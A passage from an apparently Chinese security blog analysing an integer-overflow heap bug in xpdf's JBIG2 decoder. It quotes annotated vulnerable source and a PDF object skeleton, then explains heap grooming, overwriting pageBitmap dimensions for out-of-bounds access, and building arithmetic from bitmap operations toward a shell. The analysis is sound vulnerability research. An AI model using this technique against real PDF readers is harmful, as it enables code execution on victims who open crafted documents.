class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,</span><br><span class="line">                    GBool lossless, Guint length,</span><br><span class="line">                    Guint *refSegs, Guint nRefSegs) &#123;</span><br><span class="line">  ...</span><br><span class="line">  Guint numSyms;</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;&#x2F; get symbol dictionaries and tables</span><br><span class="line">  codeTables &#x3D; new GList();</span><br><span class="line">  &#x2F;&#x2F; 1. 初始时为 0</span><br><span class="line">  numSyms &#x3D; 0;</span><br><span class="line">  for (i &#x3D; 0; i &lt; nRefSegs; ++i) &#123;</span><br><span class="line">    if ((seg &#x3D; findSegment(refSegs[i]))) &#123;</span><br><span class="line">      if (seg-&gt;getType() &#x3D;&#x3D; jbig2SegSymbolDict) &#123;</span><br><span class="line">        &#x2F;&#x2F; 2. 该变量与一个用户可控的值相加，会造成整数溢出</span><br><span class="line">        numSyms +&#x3D; ((JBIG2SymbolDict *)seg)-&gt;getSize();</span><br><span class="line">      &#125; else if (seg-&gt;getType() &#x3D;&#x3D; jbig2SegCodeTable) &#123;</span><br><span class="line">        codeTables-&gt;append(seg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;&#x2F; get the symbol bitmaps</span><br><span class="line">  &#x2F;&#x2F; 3. 整数溢出后，这里分配了一个较小的堆内存（指针数组）</span><br><span class="line">  syms &#x3D; (JBIG2Bitmap **)gmallocn(numSyms, sizeof(JBIG2Bitmap *));</span><br><span class="line">  kk &#x3D; 0;</span><br><span class="line">  for (i &#x3D; 0; i &lt; nRefSegs; ++i) &#123;</span><br><span class="line">    if ((seg &#x3D; findSegment(refSegs[i]))) &#123;</span><br><span class="line">      if (seg-&gt;getType() &#x3D;&#x3D; jbig2SegSymbolDict) &#123;</span><br><span class="line">        symbolDict &#x3D; (JBIG2SymbolDict *)seg;</span><br><span class="line">        &#x2F;&#x2F; 4. 将各个指针写入该堆内存，触发堆溢出</span><br><span class="line">        for (k &#x3D; 0; k &lt; symbolDict-&gt;getSize(); ++k) &#123;</span><br><span class="line">          syms[kk++] &#x3D; symbolDict-&gt;getBitmap(k);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于恶意构造的 <code>refSegs</code> 中，一些 <code>seg-&gt;getSize()</code> 值很大（4GB），因此如果全部写进则肯定会触发 crash。所以在实际的漏洞利用中，会尝试先做做堆风水：</p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095522.jpg" alt=""></p>
<p>看图，exploit 需要将 <strong>segments GList 的后备存储</strong>，放置在<strong>刚刚创建的溢出堆块</strong>的<strong>高地址</strong>处。这样触发堆溢出时，就能在执行前几个正常 size 的写入操作时，<strong>将后备存储中的那个超大 size 所对应的 segment 指针，替换成非 JBIG2SymbolDict 类型的 segment 指针（即 JBIG2Bitmap 类型）</strong>。之后当程序检索这个 segment 指针时，就会跳过该指针的检索。</p>
<h2 id="四、漏洞利用前置知识"><a href="#四、漏洞利用前置知识" class="headerlink" title="四、漏洞利用前置知识"></a>四、漏洞利用前置知识</h2><h3 id="1-JBIG2Decode"><a href="#1-JBIG2Decode" class="headerlink" title="1. JBIG2Decode"></a>1. JBIG2Decode</h3><p>漏洞点位于 JBIG2Stream ，而 JBIG2Stream 又怎么存在于 pdf 中呢？</p>
<p>pdf 文件结构本质上是一个树状图，这里给出一个使用 JBIG2Stream 的 pdf 片段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">4 0 obj</span><br><span class="line">&lt;&lt; &#x2F;Filter &#x2F;FlateDecode</span><br><span class="line">&#x2F;Length 3988</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&#x2F;* [MyStream1] *&#x2F;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">5 0 obj</span><br><span class="line">&lt;&lt; &#x2F;DecodeParms  &lt;&lt; &#x2F;JBIG2Globals 4 0 R &gt;&gt;</span><br><span class="line">&#x2F;Width 1024</span><br><span class="line">&#x2F;ColorSpace &#x2F;DeviceGray</span><br><span class="line">&#x2F;Height 1</span><br><span class="line">&#x2F;Filter &#x2F;JBIG2Decode</span><br><span class="line">&#x2F;Subtype &#x2F;Image</span><br><span class="line">&#x2F;Length 418248</span><br><span class="line">&#x2F;Type &#x2F;XObject</span><br><span class="line">&#x2F;BitsPerComponent 1</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&#x2F;* [MyStream2] *&#x2F;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure>

<blockquote>
<p>pdf 文件中，4 0 obj、5 0 obj 都是表示一个特定的 pdf object。</p>
</blockquote>
<p>其中，<code>4 0 obj</code> 标识了下面中的 <code>MyStream1</code>，其参数 <code>/Filter /FlateDecode</code> 表示该流是使用 zlib 压缩。</p>
<p>继续往下看可以看到： <code>5 0 obj</code> 中，<code>/DecodeParms</code> 引用了 <code>4 0 obj</code> 中的 stream 流，即 <code>MyStream1</code>；同时参数 <code>/Filter /JBIG2Decode</code> 指定了接下来的流 <code>MyStream2</code> 使用的解码方式是 <code>JBIG2Decode</code>。</p>
<p>因此从上文可以得知，<code>MyStream2</code> 使用 <strong>JBIG2Decode</strong> 进行解码，其解码参数为上面引用的这个 <code>4 0 obj</code>，即 <code>MyStream1</code> 使用 <code>FlateDecode</code> <strong>所解码后的流</strong>，而该参数的键为 <code>JBIG2Globals</code>。</p>
<p>而我们要做的，就是精心构建 <code>MyStream1</code> 和 <code>MyStream2</code>（这两个流都是 JBIG2Stream），使其在解析这两个 Stream 时能触发漏洞，从而 get shell。</p>
<p>构建好这两个流后，可以使用 <a href="https://github.com/agl/jbig2enc/blob/master/pdf.py" target="_blank" rel="noopener">jbig2enc/pdf.py</a> 来创建出 pdf。</p>
<h3 id="2-Segments-小叙"><a href="#2-Segments-小叙" class="headerlink" title="2. Segments 小叙"></a>2. Segments 小叙</h3><blockquote>
<p>注，这一节中，每个 segment 所对应的代码最好亲自阅读一下。</p>
</blockquote>
<p>当 xpdf 对 JBIG2Stream 解码时，正如上节中所示，JBIG2Decode 需要一个参数 <code>JBIG2Globals</code>。因此在解析时，会先解析 <code>JBIG2Globals</code> 的 stream，之后再解析下面的 main stream。以下代码说明了 stream 的解析过程：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JBIG2Stream::reset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    GList *t;</span><br><span class="line"></span><br><span class="line">    segments = <span class="keyword">new</span> GList();</span><br><span class="line">    globalSegments = <span class="keyword">new</span> GList();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read the globals stream</span></span><br><span class="line">    <span class="keyword">if</span> (globalsStream.isStream())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 解析以 DecodeParms 传来的 global stream 流，即 FlateDecode(MyStream1)</span></span><br><span class="line">        curStr = globalsStream.getStream();</span><br><span class="line">        curStr-&gt;reset();</span><br><span class="line">        <span class="comment">// 解析时需要使用到解码器，这里是对解码器进行初始化</span></span><br><span class="line">        arithDecoder-&gt;setStream(curStr);</span><br><span class="line">        huffDecoder-&gt;setStream(curStr);</span><br><span class="line">        mmrDecoder-&gt;setStream(curStr);</span><br><span class="line">        <span class="comment">// 开始读取 segments</span></span><br><span class="line">        readSegments();</span><br><span class="line">        curStr-&gt;close();</span><br><span class="line">        <span class="comment">// swap the newly read segments list into globalSegments</span></span><br><span class="line">        t = segments;</span><br><span class="line">        segments = globalSegments;</span><br><span class="line">        globalSegments = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read the main stream</span></span><br><span class="line">    <span class="comment">// 解析 main stream, 即 MySteram2</span></span><br><span class="line">    curStr = str;</span><br><span class="line">    curStr-&gt;reset();</span><br><span class="line">    <span class="comment">// 同样对解码器进行初始化</span></span><br><span class="line">    arithDecoder-&gt;setStream(curStr);</span><br><span class="line">    huffDecoder-&gt;setStream(curStr);</span><br><span class="line">    mmrDecoder-&gt;setStream(curStr);</span><br><span class="line">    readSegments();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pageBitmap)</span><br><span class="line">    &#123;</span><br><span class="line">        dataPtr = pageBitmap-&gt;getDataPtr();</span><br><span class="line">        dataEnd = dataPtr + pageBitmap-&gt;getDataSize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        dataPtr = dataEnd = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以了解到，<strong>JBIG2Stream 是由多个 Segment 组成的</strong>，Segment 种类较多。这里我们只关注几个有用到的 Segment。</p>
<h3 id="a-EOFSeg"><a href="#a-EOFSeg" class="headerlink" title="a. EOFSeg"></a>a. EOFSeg</h3><p>该 Segment 的解析标志了完成了全部 segment 的读取，没有其他用途。</p>
<h3 id="b-SymbolDictSeg"><a href="#b-SymbolDictSeg" class="headerlink" title="b. SymbolDictSeg"></a>b. SymbolDictSeg</h3><p>SymbolDict 主要存放了<strong>一个指向 Bitmap 的指针数组</strong>。Bitmap 可以用于存放数据，在实际漏洞利用中将起到类似内存的作用。</p>
<p>对于每个 symbol dict 中的 Bitmap，规范中将其称为一个 <strong>instance</strong>。</p>
<p>解析 SymbolDictSeg 时，将会从 stream 中读取并创建出每一个 Bitmap。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">GBool JBIG2Stream::readSymbolDictSeg(Guint segNum, Guint length,</span><br><span class="line">                                     Guint *refSegs, Guint nRefSegs)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; 创建 bitmaps 数组</span><br><span class="line">    &#x2F;&#x2F; get the input symbol bitmaps</span><br><span class="line">    bitmaps &#x3D; (JBIG2Bitmap **)gmallocn(numInputSyms + numNewSyms,</span><br><span class="line">                                       sizeof(JBIG2Bitmap *));</span><br><span class="line">    for (i &#x3D; 0; i &lt; numInputSyms + numNewSyms; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        bitmaps[i] &#x3D; NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    k &#x3D; 0;</span><br><span class="line">    inputSymbolDict &#x3D; NULL;</span><br><span class="line">    for (i &#x3D; 0; i &lt; nRefSegs; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        if ((seg &#x3D; findSegment(refSegs[i])))</span><br><span class="line">        &#123;</span><br><span class="line">            if (seg-&gt;getType() &#x3D;&#x3D; jbig2SegSymbolDict)</span><br><span class="line">            &#123;</span><br><span class="line">                inputSymbolDict &#x3D; (JBIG2SymbolDict *)seg;</span><br><span class="line">                for (j &#x3D; 0; j &lt; inputSymbolDict-&gt;getSize(); ++j)</span><br><span class="line">                &#123;</span><br><span class="line">                    bitmaps[k++] &#x3D; inputSymbolDict-&gt;getBitmap(j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; 开始尝试从外部 JBIG2Stream 流中读取 bitmap</span><br><span class="line">    symHeight &#x3D; 0;</span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    while (i &lt; numNewSyms)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; read the height class delta height</span><br><span class="line">        if (huff) [...]</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            arithDecoder-&gt;decodeInt(&amp;dh, iadhStats);</span><br><span class="line">        &#125;</span><br><span class="line">        [...]</span><br><span class="line">        symHeight +&#x3D; dh;</span><br><span class="line">        symWidth &#x3D; 0;</span><br><span class="line">        totalWidth &#x3D; 0;</span><br><span class="line">        j &#x3D; i;</span><br><span class="line"></span><br><span class="line">        [...]</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; read the symbols in this height class</span><br><span class="line">        while (1)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; read the delta width</span><br><span class="line">            if (huff) [...]</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                if (!arithDecoder-&gt;decodeInt(&amp;dw, iadwStats))</span><br><span class="line">                &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            [...]</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; using a collective bitmap, so don&#39;t read a bitmap here</span><br><span class="line">            if (huff &amp;&amp; !refAgg) [...]</span><br><span class="line">            else if (refAgg) [...]</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; 从外部流中读取 bitmap 并将其保存进数组中</span><br><span class="line">                bitmaps[numInputSyms + i] &#x3D;</span><br><span class="line">                    readGenericBitmap(gFalse, symWidth, symHeight,</span><br><span class="line">                                    sdTemplate, gFalse, gFalse, NULL,</span><br><span class="line">                                    sdATX, sdATY, 0);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; read the collective bitmap</span><br><span class="line">        if (huff &amp;&amp; !refAgg) [...]</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 创建了一个 symbolDict 结构体</span><br><span class="line">    &#x2F;&#x2F; create the symbol dict object</span><br><span class="line">    symbolDict &#x3D; new JBIG2SymbolDict(segNum, numExSyms);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 将上面创建的 bitmaps 数组复制进 symbolDict 结构体中</span><br><span class="line">    &#x2F;&#x2F; exported symbol list</span><br><span class="line">    i &#x3D; j &#x3D; 0;</span><br><span class="line">    ex &#x3D; gFalse;</span><br><span class="line">    prevRun &#x3D; 1;</span><br><span class="line">    while (i &lt; numInputSyms + numNewSyms)</span><br><span class="line">    &#123;</span><br><span class="line">        if (huff)</span><br><span class="line">            [...]</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            arithDecoder-&gt;decodeInt(&amp;run, iaexStats);</span><br><span class="line">        &#125;</span><br><span class="line">        [...]</span><br><span class="line">        if (ex)</span><br><span class="line">        &#123;</span><br><span class="line">            for (cnt &#x3D; 0; cnt &lt; run; ++cnt)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; 将上面创建的 bitmaps 对等深拷贝进 symbolDict 中</span><br><span class="line">                symbolDict-&gt;setBitmap(j++, bitmaps[i++]-&gt;copy());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            i +&#x3D; run;</span><br><span class="line">        &#125;</span><br><span class="line">        ex &#x3D; !ex;</span><br><span class="line">        prevRun &#x3D; run;</span><br><span class="line">    &#125;</span><br><span class="line">    [...] &#x2F;&#x2F; 释放 bitmaps 数组</span><br><span class="line">    &#x2F;&#x2F; store the new symbol dict</span><br><span class="line">    segments-&gt;append(symbolDict);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="c-PageInfoSeg"><a href="#c-PageInfoSeg" class="headerlink" title="c. PageInfoSeg"></a>c. PageInfoSeg</h3><p>对于每个 Page 来说，需要有一个 Bitmap 来表示当前页面渲染的数据。而在解析 PageInfoSeg 时，程序会创建一个流内全局 Bitmap：<strong>pageBitmap</strong>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readPageInfoSeg(Guint length)</span><br><span class="line">&#123;</span><br><span class="line">    Guint xRes, yRes, flags, striping;</span><br><span class="line"></span><br><span class="line">    if (!readULong(&amp;pageW) || !readULong(&amp;pageH) ||</span><br><span class="line">        !readULong(&amp;xRes) || !readULong(&amp;yRes) ||</span><br><span class="line">        !readUByte(&amp;flags) || !readUWord(&amp;striping))</span><br><span class="line">    &#123;</span><br><span class="line">        goto eofError;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; 创建流内全局字段 pageBitmap</span><br><span class="line">    pageBitmap &#x3D; new JBIG2Bitmap(0, pageW, curPageH);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; default pixel value</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">eofError:</span><br><span class="line">    error(errSyntaxError, getPos(), &quot;Unexpected EOF in JBIG2 stream&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，<strong>pageBitmap 很关键</strong>，它表示了一个 Page 的 bitmap。我们将使用堆溢出来覆写 pageBitmap 的 Width 和 Height，进而达到越界读写的目的。</p>
<blockquote>
<p>同时 PageInfoSeg 还可用于绕过一个 sanity check，下文中会提到。</p>
</blockquote>
<h3 id="d-GenericRegionSeg"><a href="#d-GenericRegionSeg" class="headerlink" title="d. GenericRegionSeg"></a>d. GenericRegionSeg</h3><p>GenericRegionSeg 的解析将会<strong>从流中读取一个 Bitmap</strong>，并<strong>与当前的 pageBitmap 的特定区域进行运算</strong>：</p>
<blockquote>
<p>需要注意的是，JBIG2Globals Stream 中的 Segment 不允许引用任何 Segment，因此 GenericRegionSeg 不能存放在 JBIG2Globals 流中。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,</span><br><span class="line">                                       GBool lossless, Guint length)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; read the bitmap</span><br><span class="line">    bitmap &#x3D; readGenericBitmap(mmr, w, h, templ, tpgdOn, gFalse,</span><br><span class="line">                               NULL, atx, aty, mmr ? length - 18 : 0);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; combine the region bitmap into the page bitmap</span><br><span class="line">    if (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        if (pageH &#x3D;&#x3D; 0xffffffff &amp;&amp; y + h &gt; curPageH)</span><br><span class="line">        &#123;</span><br><span class="line">            pageBitmap-&gt;expand(y + h, pageDefPixel);</span><br><span class="line">        &#125;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        delete bitmap;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; store the region bitmap</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，从流中读取 Bitmap 的操作位于 <code>readGenericBitmap</code> 函数中，读取的操作需要使用到<strong>编码器</strong>。</p>
<p>而与 pageBitmap 的运算主要是使用 <code>JBIG2Bitmap::combine</code> 方法，该方法中有五种运算方式，分别是 <strong>与、或、异或和替换</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">switch (combOp)</span><br><span class="line">&#123;</span><br><span class="line">    case 0: &#x2F;&#x2F; or</span><br><span class="line">        dest |&#x3D; src1 &amp; m2;</span><br><span class="line">        break;</span><br><span class="line">    case 1: &#x2F;&#x2F; and</span><br><span class="line">        dest &amp;&#x3D; src1 | m1;</span><br><span class="line">        break;</span><br><span class="line">    case 2: &#x2F;&#x2F; xor</span><br><span class="line">        dest ^&#x3D; src1 &amp; m2;</span><br><span class="line">        break;</span><br><span class="line">    case 3: &#x2F;&#x2F; xnor</span><br><span class="line">        dest ^&#x3D; (src1 ^ 0xff) &amp; m2;</span><br><span class="line">        break;</span><br><span class="line">    case 4: &#x2F;&#x2F; replace</span><br><span class="line">        dest &#x3D; (src1 &amp; m2) | (dest &amp; m1);</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们可以将外部的立即数，通过利用该段的解析过程，将其传入 pageBitmap 中等待进一步的运算。</p>
</blockquote>
<h3 id="e-GenericRefinementRegionSeg"><a href="#e-GenericRefinementRegionSeg" class="headerlink" title="e. GenericRefinementRegionSeg"></a>e. GenericRefinementRegionSeg</h3><p>GenericRefinementRegionSeg 的解析过程，组合起来可以对 pageBitmap 上的部分数据进行位运算。我们可以利用这里的位运算来构建加法器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readGenericRefinementRegionSeg(Guint segNum, GBool imm,</span><br><span class="line">                                                 GBool lossless, Guint length,</span><br><span class="line">                                                 Guint *refSegs,</span><br><span class="line">                                                 Guint nRefSegs)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    if (nRefSegs &#x3D;&#x3D; 1)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!(seg &#x3D; findSegment(refSegs[0])) ||</span><br><span class="line">            seg-&gt;getType() !&#x3D; jbig2SegBitmap)</span><br><span class="line">        &#123;</span><br><span class="line">            error(errSyntaxError, getPos(),</span><br><span class="line">                  &quot;Bad bitmap reference in JBIG2 generic refinement segment&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        refBitmap &#x3D; (JBIG2Bitmap *)seg;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        refBitmap &#x3D; pageBitmap-&gt;getSlice(x, y, w, h);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; read</span><br><span class="line">    bitmap &#x3D; readGenericRefinementRegion(w, h, templ, tpgrOn,</span><br><span class="line">                                         refBitmap, 0, 0, atx, aty);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; combine the region bitmap into the page bitmap</span><br><span class="line">    if (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        delete bitmap;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; store the region bitmap</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        bitmap-&gt;setSegNum(segNum);</span><br><span class="line">        segments-&gt;append(bitmap);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>当 GenericRefinementRegionSeg <strong>不引用任何段时</strong>，变量 nRefSegs 为 0，此时 <strong>refBitmap 为 pageBitmap 上指定 x、y、w、h 属性的一块数据空间</strong>。</p>
<p> 由于函数 <code>readGenericRefinementRegion</code> 只会受到 refBitmap 的影响，因此我们可以认定传出的bitmap 变量等价于 pageBitmap 上特定区域的数据。</p>
